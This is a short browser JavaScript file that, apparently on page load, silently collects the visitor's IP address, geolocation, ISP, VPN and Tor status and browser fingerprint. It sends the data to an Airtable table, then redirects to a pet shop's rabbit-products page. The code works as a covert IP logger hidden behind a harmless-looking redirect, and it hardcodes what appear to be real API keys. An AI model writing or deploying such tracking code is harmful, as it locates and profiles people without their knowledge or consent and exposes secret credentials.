const apiKeyIpify = 'at_CD4AT2P2KkItw9UPVyaTOOPRX0dpF';
const apiKeyAirtable = 'keyRFvlmZQa6XPoZY';
const baseId = 'appkuZjDcBLkMOjjm';
const tableName = 'tblQaOddLWYQfvIpP';


let ip;
let isp;
let lat;
let long;
let postalCode;
let city;
let region;
let timezone;
let proxy;
let vpn;
let tor;
let asName;
let asDomain;
let fieldfills;
const userAgent = navigator.userAgent;
const isMobile = /iPhone|iPad|iPod|Android/i.test(navigator.userAgent);
const screenWidth = screen.width;
const screenHeight = screen.height;
const timezoneClient = Intl.DateTimeFormat().resolvedOptions().timeZone;
const OSplatform = navigator.platform;

const appVersion = navigator.appVersion;
let OSversion;

if (/Win/.test(appVersion)) {
    OSversion = "Windows";
} else if (/Mac/.test(appVersion)) {
    OSversion = "MacOS";
} else if (/Linux/.test(appVersion)) {
    OSversion = "Linux";
} else {
    OSversion = "Unknown";
}

function fetchData() {
    return new Promise((resolve, reject) => {
        fetch(`https://geo.ipify.org/api/v2/country,city,vpn?apiKey=${apiKeyIpify}`)
            .then(response => response.json())
            .then(data => {
                id = '1';
                ip = data.ip;
                isp = data.isp;
                lat = data.location.lat;
                long = data.location.lng;
                postalCode = data.location.postalCode;
                city = data.location.city;
                region = data.location.region;
                timezone = data.location.timezone;
                proxy = data.proxy.proxy;
                vpn = data.proxy.vpn;
                tor = data.proxy.tor;
                asName = data.as.name;
                asDomain = data.as.domain;


                fieldfills = {
                    fields: {
                        'ip': ip,
                        'isp': isp,
                        'lat': lat,
                        'long': long,
                        'postalCode': postalCode,
                        'city': city,
                        'region': region,
                        'timezone': timezone,
                        'proxy': proxy,
                        'vpn': vpn,
                        'tor': tor,
                        'asName': asName,
                        'asDomain': asDomain,
                        'userAgent': userAgent,
                        'screenWidth': screenWidth,
                        'screenHeight': screenHeight,
                        'timezoneClient': timezoneClient,
                        'OSplatform': OSplatform,
                        'OSversion': OSversion,
                        'appVersion': appVersion,
                        'isMobile': isMobile,


                    }
                };
                resolve(fieldfills);
            })
            .catch(error => {
                console.error(error);
                reject(error);
            });
    });
}
fetchData().then(() => {
    console.log(fieldfills);
})

fetchData().then(() => {
    axios.post(`https://api.airtable.com/v0/${baseId}/${tableName}`, fieldfills, {
        headers: {
            Authorization: `Bearer ${apiKeyAirtable}`,
            'Content-Type': 'application/json'
        }
    })
        .then(response => {
            console.log(response.data);
            location.href = "https://shop.smallpetselect.com/pages/rabbit-products";

        })
        .catch(error => {
            console.error(error);
        });
});


